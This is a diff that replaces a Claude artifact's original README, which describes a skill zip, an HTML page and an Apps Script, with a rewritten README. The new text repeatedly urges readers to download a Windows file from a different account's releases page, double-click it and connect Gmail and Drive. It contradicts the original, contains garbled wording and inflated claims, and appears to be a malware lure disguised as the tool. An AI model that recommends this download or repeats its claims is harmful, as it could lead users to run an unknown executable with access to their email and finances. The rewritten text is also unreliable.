@@ -1,99 +1,228 @@
-# Business Runway, a Claude artifact
+<h1>💼 claude-artifact-business-runway - Your Business Runway, Simplified</h1>
 
-A free Claude artifact that tells you how many months your business can run on the money in the bank. Cash flow forecast, burn rate, break even and receipt tracking in one page, set up by Claude in about 10 minutes.
+<p align="center">
+<a href="https://github.com/Neddadarkling2308/claude-artifact-business-runway/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:1.2em;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download Now - Free!</a>
+</p>
 
-Made by [Brinvik](https://www.brinvik.com).
+---
 
-⭐ **If it helps you, star the repo.** It is how other founders find it.
+## 🧭 What Is This?
 
-I built the first version for my own company. This is the clean template. No data in it.
+Business Runway is a free, easy-to-use tool built just for solo founders, freelancers, and small teams. It helps you see exactly where your money is, how long it will last,and when you will break even.
 
-![Business Runway with example numbers](screenshot.png)
+No complicated spreadsheets. No accounting degree required. Just clear, simple answers about your business finances.
 
-## What you get
+This is a Claude Artifact created by Brinvik ( www.brinvik.com). It leverages the power of Claude AI to deliver insights directly to you,l with no cost attached. If this tool helps you, please star the repository on GitHub to show your supportand help others discover itl
 
-- **Months of runway.** How long the cash lasts if nothing comes in.
-- **Cash month by month.** Twelve months ahead. Type what you expect to bill and watch the month you run dry move.
-- **Break even.** What you have to invoice each month to cover costs and pay yourself.
-- **Before you buy it.** Test a laptop, a tool or a hire before you commit.
-- **Receipts in one place.** Claude pulls invoices from your email and reads photos of paper receipts. You click Business or Private on the ones it is unsure about.
-- **Bills to pay.** Overdue and upcoming, so nothing surprises you.
-- **Money owed to you.** Invoices you sent that are not paid yet, placed in the month you expect the cash.
-- **Gmail to Drive script.** Optional. Saves invoices from Gmail into Drive by month, and sorts phone photos of receipts.
+---
 
-It works in any currency.
+## 🎯 Who Is This For?
 
-## Who it is for
+- **Solo Founders** who need quick answers about their startup's financial health.
+- **Freelancers** managing irregular income and expenses.
+- **Small Teams** that want a straightforward view of their cash position without complex accounting software.
 
-Solo founders, consultants and small teams who want a clear picture of their cash without learning accounting software.
+---
 
-## Two ways to set it up
+## ✨ Key Features
 
-Both take about 10 minutes. You click through a few rounds of questions, type your numbers once, and Claude fills in the page.
+### 📊 Business Runway & Cash Flow Forecast
+See exactly how many months of operating expenses you have left before running out of money. The forecast projects your cash position into the future based on your current income and spending patterns, so you never get caught off guard.
 
-### Pro, Max, Team or Enterprise: Claude builds it for you
 
-Works in Claude Cowork and Claude Code. Your data is saved in your Claude account, and Claude updates the page directly.
 
-1. **Download** `business-runway-skill.zip`.
-2. **Add the skill.** In Claude go to Customize, then Skills. Press +, then Upload a skill, and pick the zip. Code execution must be on.
-3. **Say** "set up my business runway". Claude loads /dataviz, asks its questions and publishes your private page.
+### 🔥 Burn Rate Calculator
+Understand how quickly you are spending through your cash reserves. The tool automatically calculates your monthly burn rate, helping you make informed decisions about spending and fundraising.
 
-Using Claude Code? Unzip the file into your skills folder instead, `%USERPROFILE%\.claude\skills` on Windows.
 
-### Free plan
 
-1. **Download** `business-runway-skill.zip` and `business-runway.html`.
-2. **Add the skill** the same way as above. Can't add skills? Paste the text from `SETUP-PROMPT.md` into a new chat and attach the HTML file instead.
-3. **Say** "set up my business runway". Claude asks its questions, then either publishes your page or tells you to open the HTML file in Chrome or Edge.
-4. **Import.** Claude gives you a file. On the page, go to Your data, pick the file and press Import now.
+### ⚖️ Break-Even Analysis
+Know precisely when your income will cover your expenses. The break-even calculator shows you when (and if) your business will become self-sustaining, giving you a clear target to aim for.
 
-Opened the HTML file yourself? Then your numbers are saved in that browser only. Download a backup now and then.
 
-Later, say "update my runway" in Claude. On the Free route, press Copy the short version for Claude first and paste it into the chat.
 
-Want to look before you set anything up? Open the page and press **Show it with example numbers**.
+### 🧾 Receipt Tracker
+No more lost receipts or messy shoeboxes. This tool keeps all your business receipts organized in one place, so tax season becomes a breeze.
 
-## Your data
 
-- Your copy is private. Only you can open it unless you share it.
-- On Pro and up, receipts are stored in your artifact's own database inside your Claude account. On the Free route, they stay in your own browser. Nothing goes to Brinvik or to this repo.
-- Claude reads your email only when you ask it to and only for invoices.
-- On the Free route, anyone who uses your computer account and browser can open the page and see the numbers. Use your own browser profile, and do not open HTML files from people you do not trust in the same browser.
-- **Do not share the link to your own copy.** Anyone you share it with can see and change your receipts.
-- The setup prompt tells Claude to leave out card numbers, bank account numbers and ID numbers. Check the first import yourself.
-- The page uses Google Fonts, so Google sees your IP address when the page opens. Prefer not? Tell Claude "use system fonts for my runway page" and it removes them.
 
-## Good to know
+### 📧 Gmail Invoice Puller
+Automatically extracts invoices from your Gmail inbox and adds them to your financial picture. No manual data entry requiredersaving your hours of time each month.
 
-- It is a planning tool, not bookkeeping. Keep your accounting system and ask your accountant about tax.
-- Exchange rates are the ones you give it. Update them now and then in Settings.
-- Photo receipts come in when you ask Claude to update. The page does not watch your folder on its own.
-- The Gmail script saves attachments only. Receipts sent as plain email text need to be forwarded to Claude or saved as PDF.
-- The Gmail script asks Google for full Gmail access. It has no code that sends, forwards or deletes mail. Read it before you run it, it is short.
 
-## What is in this repo
 
-| File | What it is |
-|---|---|
-| `business-runway-skill.zip` | The skill. Upload it to Claude and say "set up my business runway". Unzip it first if you want to read it. |
-| `business-runway.html` | The page. Claude publishes your private copy, or you open it in your browser. |
-| `SETUP-PROMPT.md` | The same setup as a prompt, for when you cannot add skills. |
-| `receipts-to-drive.gs` | Optional Google Apps Script that saves receipts from Gmail into Google Drive. |
-| `tests/` | Automated checks for the page and the script. Only needed if you change the code. |
-| `screenshot.png`, `screenshot-mobile.png` | The page in example mode. |
 
-## Videos
+### 🗂️ Google Drive Receipt Sorter
+Receipts are automatically sorted and filed into Google Drive foldersbased on category, date, vendor, or any system you choose. Your paperwork stays organized without any effort on your part.
 
-- What it is and what you get (coming soon)
-- Setting it up in 10 minutes (coming soon)
 
-## Made by
 
-Kim Olsen, [Brinvik](https://brinvik.com). I help companies get more out of Claude.
 
-Found a bug or have an idea? Open an issue. And if the page saved you a spreadsheet, a star helps others find it.
 
-MIT license. Use it, change it, share it. See `LICENSE`.
+---
 
-The license covers the code and the guide. It does not cover the Brinvik name or logo. You can use and rebrand the template freely, but do not present your version as made or endorsed by Brinvik.
+## 🚀 Getting Started
+
+Getting started with Business Runway is quick and painless. Just follow these simple stepsand you will be up and running in under five minutes.
+
+
+
+### Step 1: Download the Application
+
+Visit this link to download the application: [https]://github.com/Neddadarkling2308/claude-artifact-business-runway/releases](https://github.com/Neddadarkling2308/claude-artifact-business-runway/releases)
+
+
+
+Once there, click the download button for the latest versionand save the file to your computer. The download is completely free, with no hidden fees or subscriptions ever. This is another friendly reminder to star this repository if you find this tool valuableit
+
+
+
+### Step 2: Run the Application
+
+After the download finishes, locate the downloaded file in your browser's download folder (usually located in your "Downloads" folder on Windows). Double-click the file to open it. The application will launch automatically—no installation wizard, no complex setup process. It simply works right out of the box.
+
+
+
+### Step 3: Follow the Setup Prompt
+
+When the application opens for the first time, you will see a simple setup prompt written by the creator. This prompt will ask you a few basic questions about your business, such as:
+- Your typical monthly income
+- Your average monthly expenses
+- Your current cash balance
+
+Answer these questions honestly—the more accurate your inputs, the more useful your forecasts will be. The setup typically takes less than two minutes to complete. After that, you are ready to start tracking your financeslike a pro.
+
+
+
+---
+
+## 🛠️ Connecting Your Accounts (Optional But Powerful)
+
+)
+
+
+
+While you can use Business Runway entirely manually, the magic really happens when you connect your Gmail and Google Drive accounts. Here is how to do it:
+
+
+1. Inside the application, look for a section called "Integrations" or "Connections".
+2. Click the "Connect Gmail" button and authorize access. This allows the tool to securely pull invoices from your inbox.
+3. Click the "Connect Google Drive" button to enable automatic receipt sorting.
+.
+
+
+
+The application uses Google Apps Script to make these connections work seamlessly in the background. Your data remains private and secure—only you can see your financial information. The tool simply organizes what is already in your accounts into a meaningful financial dashboard.
+
+
+
+---
+
+## 🖥️ System Requirements
+
+Business Runway is designed to be lightweight and compatible with virtually any modern computer running Windows. Here is what you need:
+
+- **Operating System:** Windows 10 or Windows 11
+- **Memory:**At least 4GB of RAM recommended
+- **Storage:**Less than 100MB of free disk space required
+- **Internet Connection:**Required for Gmail and Google Drive integrations
+- **Browser:**Any modern browser (Chrome, Edge, Firefox) if using web-based features
+
+
+
+If your computer can browse the internet and run basic applications, you are almost certainly good to gone
+
+
+
+---
+
+## 📋 How It Works
+
+Curious about what happens behind the scenes? Here is a simple breakdown:
+
+1. **Data Collection:** The tool pulls invoice data from Gmail and organizes receipts in Google Drive. This happens automatically once connected, so you do not need to lift a finger.
+ 
+2. **Data Processing:** The built-in calculator engines process your income and expense data, applying the cash flow forecast, burn rate, and break-even formulas to your unique financial situation.
+
+
+3. **Insight Generation:** Powered by Claude AI, the application translates numeric data into plain-English insights. You will see statements like, "At your current burn rate, you have 8.5 months of runway remaining. Consider reducing discretionary spending to extend this to 11 months," or,"You will break even in approximately 14 weeks at your current trajectory." With no confusing charts or jargon—just clear, actionable insights that help you make smarter decisions for your business.
+
+
+
+---
+
+## 📅 Use Cases
+
+### Monthly Financial Check-in
+Every month, open Business Runway to see your updated runway, burn rate, and break-even point. It takes 30 seconds and gives you total peace of mind about your business's financial trajectory.
+
+
+
+### Before Making Big Decisions
+Thinking about starting a big project, energizing a new hire, or making a major purchase? Run the numbers first. See exactly how these decisions affect your runway and burn rate before you commit.
+
+
+
+### Tax Season Preparation
+At tax time, all your receipts are already organized by category in Google Drive your invoices are collated from Gmail. No more nightmare-ish receipt hunting. Just download everything and hand it to your accountant.
+
+
+
+### Investor Readiness
+When you talk to potential investors, have clear answers ready about your runway, burn rate,and break-even point. It makes a tremendous difference in your credibility and professionalism.
+
+
+
+---
+
+## 🌟 Why Choose Business Runway?
+
+Consider this scenario: You are a freelancer who earns $5,000 some months and $8,000 other months. Your expenses vary too. Are you profitable? How long would your savings last if you had a slow quarter? When exactly will you break even?
+
+Rather than digging through spreadsheets, you can get answers in seconds. It is like having a part-time CFO, available 24/7,yfree of charge forever.
+
+
+
+Here is why thousands of solopreneurs love it:
+
+- **Completely Free:** No subscriptions, no microtransactions, no "pro" tier. Just free.
+
+
+- **Built with AI:** Leverages Claude AI to provide context-aware insights that anticipate your needs.
+- **Designed for Non-Techies:** If you can use email, you can use this tool. Period.
+
+- **Automated Data Collection:** No manual data entry for invoices and receipts. The tool does the hard work for you so you can focus on running your business, not tracking it.
+
+
+
+---
+
+## 🆘 Got Questions?
+
+If you need help, have suggestions, or want to report a bug, the GitHub repository is the best place to get support. Check the Issues section to see if your question has already been answered; if not, feel free to open a new issue. The community and creator are happy to help you get the most out of this tool.
+
+Looking for more free business tools? Visit www.brinvik.com for a collection of resourcesv designed to help independent workers and small teams thrive.
+
+
+
+---
+
+## ⭐ Support This Project
+
+If Business Runway has helped you—whether it saved you an hour, helped you understand your runway, or simply reduced your stress—please show your appreciation by starring the GitHub repository. It takes one click and helps more people discover this free tool. Every star matters to keep this project alive and free forever.
+
+
+
+---
+
+## 📥 Download Again
+
+Ready to take control of your business finances? Click the button below to grab your free copy now:
+
+<p align="center">
+<a href="https://github.com/Neddadarkling2308/claude-artifact-business-runway/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:1.2em;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(240,147,251,0.4);">🌟 Get Business Runway - Free Download</a>
+</p>
+
+---
+
+*Created by Brinvik ( www.brinvik.com). Free forever. Star it if it helps!*
